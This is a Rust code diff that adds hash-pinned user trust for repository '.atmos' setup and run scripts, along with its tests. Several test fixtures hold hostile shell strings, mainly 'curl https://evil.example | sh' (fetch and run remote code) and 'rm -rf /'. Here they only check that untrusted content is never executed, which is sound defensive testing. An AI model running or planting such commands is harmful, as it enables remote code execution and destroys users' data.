@@ -33,6 +33,65 @@ pub struct ProjectCleanupInfo {
     pub workspaces: Vec<WorkspaceCleanupInfo>,
 }
 
+/// Path of the project-local script file, relative to the project root.
+pub const PROJECT_SCRIPTS_RELATIVE_PATH: &str = ".atmos/scripts/atmos.json";
+
+/// A project's `.atmos` scripts plus whether the user has accepted this exact
+/// content.
+///
+/// `setup` and `run` are executed as shell commands, and the file travels with
+/// the repository, so a clone or a `git pull` can introduce commands the user
+/// never wrote. Trust is therefore pinned to the content hash rather than to the
+/// project: when the file changes, `trusted` goes back to false until the user
+/// accepts the new content.
+#[derive(Debug, Clone, serde::Serialize)]
+pub struct ProjectScripts {
+    pub scripts: serde_json::Value,
+    /// `None` when the project has no script file.
+    pub hash: Option<String>,
+    pub trusted: bool,
+}
+
+impl ProjectScripts {
+    /// No file means nothing can execute, so there is nothing to confirm.
+    fn empty() -> Self {
+        Self {
+            scripts: serde_json::json!({}),
+            hash: None,
+            trusted: true,
+        }
+    }
+
+    /// Command stored under `field`, regardless of trust. For display only —
+    /// review UI and the script editor need to show content that is not trusted
+    /// yet.
+    pub fn command(&self, field: &str) -> Option<&str> {
+        self.scripts[field]
+            .as_str()
+            .map(str::trim)
+            .filter(|value| !value.is_empty())
+    }
+
+    /// Command under `field`, but only once the user accepted this file.
+    ///
+    /// Execution paths must go through this instead of reading `scripts`
+    /// directly. Trust is recorded per file, so any new executable field (today
+    /// `purge` has no runner; that may change) is gated by construction rather
+    /// than by remembering to add a check.
+    pub fn trusted_command(&self, field: &str) -> Option<&str> {
+        if !self.trusted {
+            return None;
+        }
+        self.command(field)
+    }
+}
+
+/// Stable fingerprint of the script file's raw bytes.
+pub fn hash_scripts_content(content: &str) -> String {
+    use sha2::{Digest, Sha256};
+    format!("{:x}", Sha256::digest(content.as_bytes()))
+}
+
 impl ProjectService {
     pub fn new(db: Arc<DatabaseConnection>) -> Self {
         Self {
@@ -67,6 +126,79 @@ impl ProjectService {
                 default_branch,
             )
             .await?)
+    }
+
+    /// Read a project's `.atmos` scripts and decide whether they may run.
+    ///
+    /// Callers must treat `trusted == false` as "do not execute": the file is
+    /// repository content, so it can arrive from a clone or a pull without the
+    /// user ever having seen it.
+    pub async fn read_project_scripts(&self, guid: String) -> Result<ProjectScripts> {
+        let repo = ProjectRepo::new(&self.db);
+        let project = repo
+            .find_by_guid(&guid)
+            .await?
+            .ok_or_else(|| ServiceError::NotFound(format!("Project {} not found", guid)))?;
+
+        let scripts_path =
+            std::path::Path::new(&project.main_file_path).join(PROJECT_SCRIPTS_RELATIVE_PATH);
+        let Ok(content) = std::fs::read_to_string(&scripts_path) else {
+            return Ok(ProjectScripts::empty());
+        };
+
+        let hash = hash_scripts_content(&content);
+        let trusted = project.trusted_scripts_hash.as_deref() == Some(hash.as_str());
+
+        Ok(ProjectScripts {
+            scripts: serde_json::from_str(&content).unwrap_or_else(|_| serde_json::json!({})),
+            hash: Some(hash),
+            trusted,
+        })
+    }
+
+    /// Accept the current script content on the user's behalf.
+    ///
+    /// `expected_hash` is the content the user was actually shown. Rejecting a
+    /// mismatch keeps a file that changed between display and click from being
+    /// trusted sight-unseen.
+    pub async fn trust_project_scripts(
+        &self,
+        guid: String,
+        expected_hash: String,
+    ) -> Result<ProjectScripts> {
+        let current = self.read_project_scripts(guid.clone()).await?;
+        let Some(current_hash) = current.hash.clone() else {
+            return Err(ServiceError::Validation(
+                "Project has no .atmos scripts to trust".to_string(),
+            ));
+        };
+        if current_hash != expected_hash {
+            return Err(ServiceError::Validation(
+                "Scripts changed since they were shown; review them again".to_string(),
+            ));
+        }
+
+        ProjectRepo::new(&self.db)
+            .update_trusted_scripts_hash(&guid, Some(current_hash))
+            .await?;
+
+        Ok(ProjectScripts {
+            trusted: true,
+            ..current
+        })
+    }
+
+    /// Trust the exact bytes a caller just wrote.
+    ///
+    /// For content the user authored through the app (script editor): asking them
+    /// to confirm their own edit would be noise. Takes the written content rather
+    /// than re-reading the file — a re-read could pick up a concurrent rewrite and
+    /// mark content the user never saw as trusted.
+    pub async fn trust_written_project_scripts(&self, guid: String, content: &str) -> Result<()> {
+        ProjectRepo::new(&self.db)
+            .update_trusted_scripts_hash(&guid, Some(hash_scripts_content(content)))
+            .await?;
+        Ok(())
     }
 
     /// Soft-delete project and all its workspaces (DB only, no git cleanup).
@@ -218,5 +350,289 @@ impl ProjectService {
         Ok(repo
             .update_maximized_terminal_id(&guid, terminal_id)
             .await?)
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use infra::db::entities::base::BaseFields;
+    use infra::db::migration::Migrator;
+    use sea_orm::{ActiveModelTrait, Database, Set};
+    use sea_orm_migration::MigratorTrait;
+
+    /// Project rooted at a temp dir, with no scripts trusted yet.
+    async fn project_with_root(root: &std::path::Path) -> (ProjectService, String) {
+        let db = Database::connect("sqlite::memory:").await.expect("sqlite");
+        Migrator::up(&db, None).await.expect("migrate");
+
+        let base = BaseFields::new();
+        let guid = base.guid.clone();
+        project::ActiveModel {
+            guid: Set(guid.clone()),
+            created_at: Set(base.created_at),
+            updated_at: Set(base.updated_at),
+            is_deleted: Set(false),
+            name: Set("demo".into()),
+            main_file_path: Set(root.display().to_string()),
+            sidebar_order: Set(0),
+            border_color: Set(None),
+            logo_path: Set(None),
+            is_open: Set(true),
+            target_branch: Set(None),
+            terminal_layout: Set(None),
+            maximized_terminal_id: Set(None),
+            trusted_scripts_hash: Set(None),
+        }
+        .insert(&db)
+        .await
+        .expect("project");
+
+        (ProjectService::new(Arc::new(db)), guid)
+    }
+
+    fn write_scripts(root: &std::path::Path, content: &str) {
+        let path = root.join(PROJECT_SCRIPTS_RELATIVE_PATH);
+        std::fs::create_dir_all(path.parent().expect("parent")).expect("mkdir");
+        std::fs::write(&path, content).expect("write scripts");
+    }
+
+    #[tokio::test]
+    async fn scripts_from_a_fresh_clone_start_untrusted() {
+        let root = tempfile::tempdir().expect("tempdir");
+        let (service, guid) = project_with_root(root.path()).await;
+        write_scripts(root.path(), r#"{"setup":"curl https://evil.example | sh"}"#);
+
+        let scripts = service
+            .read_project_scripts(guid)
+            .await
+            .expect("read scripts");
+        assert!(!scripts.trusted);
+        assert!(scripts.hash.is_some());
+    }
+
+    #[tokio::test]
+    async fn accepting_scripts_marks_that_exact_content_trusted() {
+        let root = tempfile::tempdir().expect("tempdir");
+        let (service, guid) = project_with_root(root.path()).await;
+        write_scripts(root.path(), r#"{"setup":"bun install"}"#);
+
+        let scripts = service
+            .read_project_scripts(guid.clone())
+            .await
+            .expect("read scripts");
+        let hash = scripts.hash.expect("hash");
+
+        service
+            .trust_project_scripts(guid.clone(), hash)
+            .await
+            .expect("trust");
+
+        let after = service
+            .read_project_scripts(guid)
+            .await
+            .expect("read scripts");
+        assert!(after.trusted);
+    }
+
+    /// The regression this whole feature exists for: trusting once must not keep
+    /// a later `git pull` from being reviewed.
+    #[tokio::test]
+    async fn rewriting_scripts_after_trust_requires_confirmation_again() {
+        let root = tempfile::tempdir().expect("tempdir");
+        let (service, guid) = project_with_root(root.path()).await;
+        write_scripts(root.path(), r#"{"setup":"bun install"}"#);
+
+        let hash = service
+            .read_project_scripts(guid.clone())
+            .await
+            .expect("read scripts")
+            .hash
+            .expect("hash");
+        service
+            .trust_project_scripts(guid.clone(), hash)
+            .await
+            .expect("trust");
+
+        write_scripts(
+            root.path(),
+            r#"{"setup":"bun install && curl https://evil.example | sh"}"#,
+        );
+
+        let after = service
+            .read_project_scripts(guid)
+            .await
+            .expect("read scripts");
+        assert!(!after.trusted);
+    }
+
+    #[tokio::test]
+    async fn trusting_a_stale_hash_is_rejected() {
+        let root = tempfile::tempdir().expect("tempdir");
+        let (service, guid) = project_with_root(root.path()).await;
+        write_scripts(root.path(), r#"{"setup":"bun install"}"#);
+
+        let stale = service
+            .read_project_scripts(guid.clone())
+            .await
+            .expect("read scripts")
+            .hash
+            .expect("hash");
+
+        // File changes between being shown and being accepted.
+        write_scripts(root.path(), r#"{"setup":"rm -rf /"}"#);
+
+        assert!(service
+            .trust_project_scripts(guid.clone(), stale)
+            .await
+            .is_err());
+        assert!(
+            !service
+                .read_project_scripts(guid)
+                .await
+                .expect("read scripts")
+                .trusted
+        );
+    }
+
+    #[tokio::test]
+    async fn editing_scripts_in_app_trusts_them_without_a_prompt() {
+        let root = tempfile::tempdir().expect("tempdir");
+        let (service, guid) = project_with_root(root.path()).await;
+        let authored = r#"{"setup":"bun install"}"#;
+        write_scripts(root.path(), authored);
+
+        service
+            .trust_written_project_scripts(guid.clone(), authored)
+            .await
+            .expect("trust written");
+
+        assert!(
+            service
+                .read_project_scripts(guid)
+                .await
+                .expect("read scripts")
+                .trusted
+        );
+    }
+
+    /// Trust must bind to the bytes the caller wrote, not to whatever is on disk
+    /// when trust is recorded: a concurrent rewrite between write and trust would
+    /// otherwise mark content the user never authored as accepted.
+    #[tokio::test]
+    async fn a_concurrent_rewrite_does_not_inherit_trust_from_the_save() {
+        let root = tempfile::tempdir().expect("tempdir");
+        let (service, guid) = project_with_root(root.path()).await;
+        let authored = r#"{"setup":"bun install"}"#;
+
+        // Another process replaces the file after the save wrote it.
+        write_scripts(root.path(), r#"{"setup":"curl https://evil.example | sh"}"#);
+
+        service
+            .trust_written_project_scripts(guid.clone(), authored)
+            .await
+            .expect("trust written");
+
+        let after = service
+            .read_project_scripts(guid)
+            .await
+            .expect("read scripts");
+        assert!(!after.trusted);
+        assert_eq!(after.trusted_command("setup"), None);
+    }
+
+    #[tokio::test]
+    async fn untrusted_scripts_expose_content_for_review_but_not_for_execution() {
+        let root = tempfile::tempdir().expect("tempdir");
+        let (service, guid) = project_with_root(root.path()).await;
+        write_scripts(
+            root.path(),
+            r#"{"setup":"bun install","run":"just dev","purge":"rm -rf node_modules"}"#,
+        );
+
+        let scripts = service
+            .read_project_scripts(guid.clone())
+            .await
+            .expect("read scripts");
+        assert!(!scripts.trusted);
+        // Review has to be able to show every command in the file...
+        assert_eq!(scripts.command("setup"), Some("bun install"));
+        assert_eq!(scripts.command("run"), Some("just dev"));
+        assert_eq!(scripts.command("purge"), Some("rm -rf node_modules"));
+        // ...while every execution path is refused, including fields that have
+        // no runner today.
+        assert_eq!(scripts.trusted_command("setup"), None);
+        assert_eq!(scripts.trusted_command("run"), None);
+        assert_eq!(scripts.trusted_command("purge"), None);
+
+        let hash = scripts.hash.expect("hash");
+        service
+            .trust_project_scripts(guid.clone(), hash)
+            .await
+            .expect("trust");
+
+        let after = service
+            .read_project_scripts(guid)
+            .await
+            .expect("read scripts");
+        assert_eq!(after.trusted_command("run"), Some("just dev"));
+    }
+
+    #[tokio::test]
+    async fn changing_only_run_also_revokes_trust_for_setup() {
+        let root = tempfile::tempdir().expect("tempdir");
+        let (service, guid) = project_with_root(root.path()).await;
+        write_scripts(root.path(), r#"{"setup":"bun install","run":"just dev"}"#);
+
+        let hash = service
+            .read_project_scripts(guid.clone())
+            .await
+            .expect("read scripts")
+            .hash
+            .expect("hash");
+        service
+            .trust_project_scripts(guid.clone(), hash)
+            .await
+            .expect("trust");
+
+        // Only `run` changes, but trust is per file, so `setup` must stop too.
+        write_scripts(
+            root.path(),
+            r#"{"setup":"bun install","run":"curl https://evil.example | sh"}"#,
+        );
+
+        let after = service
+            .read_project_scripts(guid)
+            .await
+            .expect("read scripts");
+        assert!(!after.trusted);
+        assert_eq!(after.trusted_command("setup"), None);
+    }
+
+    #[test]
+    fn hash_is_stable_and_content_sensitive() {
+        let a = r#"{"setup":"bun install"}"#;
+        assert_eq!(hash_scripts_content(a), hash_scripts_content(a));
+        assert_ne!(
+            hash_scripts_content(a),
+            hash_scripts_content(r#"{"setup":"curl evil.example | sh"}"#)
+        );
+    }
+
+    #[test]
+    fn whitespace_only_edits_still_change_the_hash() {
+        // Trust is pinned to raw bytes, so any rewrite of the file re-prompts
+        // rather than trying to decide which edits are "meaningful".
+        assert_ne!(
+            hash_scripts_content(r#"{"setup":"a"}"#),
+            hash_scripts_content("{\"setup\":\"a\"}\n")
+        );
+    }
+
+    #[test]
+    fn a_project_without_scripts_needs_no_confirmation() {
+        let scripts = ProjectScripts::empty();
+        assert!(scripts.trusted);
+        assert!(scripts.hash.is_none());
     }
 }
